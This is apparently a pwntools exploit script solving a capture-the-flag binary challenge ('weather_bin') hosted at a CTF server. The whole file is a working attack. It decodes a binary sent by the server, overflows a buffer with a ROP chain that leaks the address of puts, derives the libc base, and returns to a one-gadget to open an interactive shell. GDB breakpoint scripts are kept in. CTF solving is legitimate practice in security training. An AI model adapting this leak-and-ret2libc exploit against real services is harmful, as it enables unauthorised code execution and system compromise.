from pwn import *

pwnable = './weather_bin'

elf = ELF(pwnable)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'amd64')

context.log_level = 'DEBUG'

debug_set = ''

debug_set_1 = '''
    b *0x555555554e94
    '''
debug_set_2 = '''
    b *0x555555554e23
    b *0x555555554cbe
    b *0x555555554ebb
    '''
debug_set_3 = '''
    b *0x555555554f4c
    b *0x555555554ebb
    commands
        x/25gx 0x00007fffffffe4f0-16
        p/d 0xff
        x/25gx 0x00007fffffffe580-16
        silent
    end
    b *0x555555554ec0
    commands
        x/25gx 0x00007fffffffe4f0-16
        p/d 0xff
        x/25gx 0x00007fffffffe580-16
        silent
    end
    b *0x555555554cbe
    b *0x555555554e43
    b *0x555555554fcb
    b *0x555555554fee
    commands
        set *(int64_t *)0x00007fffffffe5c0=*(int64_t *)0x00007ffff7ff6000
        set *(int64_t *)0x00007fffffffe5c8=*(int64_t *)0x00007ffff7ff6008
    end
    '''
debug_set_4 = '''
    b *0x004035f3
    b *0x403a53
    '''



if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = process(pwnable, aslr=True)
    gdb.attach(p, debug_set_4)
else:
    p = remote('challs.xmas.htsp.ro', 12002)




#p.recvuntil("? ")
p.recvuntil("Content: ")
binary = p.recvline()

print("binary :: " + binary[2:-2])
#dynamic_elf = ELF(base64.b64decode(binary))
f = open("dynamic_elf", "w")
f.write(base64.b64decode(binary[2:-2]))
f.close()
dynamic_elf = ELF('./dynamic_elf')
text_header = dynamic_elf.read(dynamic_elf.get_section_by_name('.text').header.sh_addr, 35)

header = u64(text_header[32:35] + "\x00\x00\x00\x00\x00")

buffer_size = dynamic_elf.read(header, 9)

print("buffer_size :: " + hex(u64(buffer_size[7:9] + "\x00\x00\x00\x00\x00\x00")))

print("dynamic_elf.read(0x00403752, 10) :: " + hex(u64(text_header[32:35] + "\x00\x00\x00\x00\x00" )))
dynamic_rop_chain = ROP(dynamic_elf)

dynamic_rop_chain.call(dynamic_elf.plt['puts'], [dynamic_elf.got['puts']])


#I used this loop to stall while I disasbelmed the binary and get the offset,
#super hacky but it worked lol :D
for i in range(20):
    print (str(i) + "seconds left")
    time.sleep(1.0)


f = open("super_secret_buffer_size.txt", "r")
buffer_size = f.read()
f.close()
buffer_size = (int(buffer_size, 16) + 8)

print("buffer_size :: " + str(buffer_size))

p.sendline("A"*buffer_size + str(dynamic_rop_chain) + p64(header))
p.recvuntil("!\n")
p.recvuntil("!\n")
blah = p.recv(6) + "\x00\x00"

print("leaked add :: " + hex(u64(blah)))

libc_base = u64(blah) - libc.sym['puts']
libc.address = libc_base
bin_shell = libc.search('/bin/sh').next()

print("bin_shell :: " + hex(bin_shell))
print("system :: " + hex(libc.sym['system']))

rop_chain = ROP(pwnable)
rop_chain.call(libc.sym['system'], [bin_shell])

p.recvuntil("? ")

p.sendline("A"*buffer_size  +  p64(libc_base + 0x10a38c))


p.recvline()
p.recvline()
p.interactive()
